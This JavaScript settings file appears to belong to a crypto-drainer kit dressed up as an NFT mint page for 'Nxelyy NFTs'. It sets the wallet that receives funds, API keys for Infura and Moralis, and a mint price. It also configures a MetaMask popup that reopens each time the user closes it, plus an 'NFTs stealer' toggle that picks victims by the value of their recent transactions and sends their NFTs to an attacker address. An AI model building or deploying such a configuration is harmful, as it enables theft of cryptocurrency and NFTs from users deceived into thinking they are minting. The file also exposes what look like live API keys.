const address = "0xB3Ca2d678D16E587fF3e1508fC5A7357CD81238e";
const infuraId = "6d233bb428724900aa1d6ac6bba531b1"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "8lLcZsKmH7Scwxzqp7O3REOhP8nGAMh9CjJTjKwVMQzYJ16fKNs9rClIsQOq0kyx"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Nxelyy NFTs",
    title: "Fuck Scammers", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "08.03.2022",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/Nxelly_",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.2,         // Price per NFT.
    totalSupply: 667,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion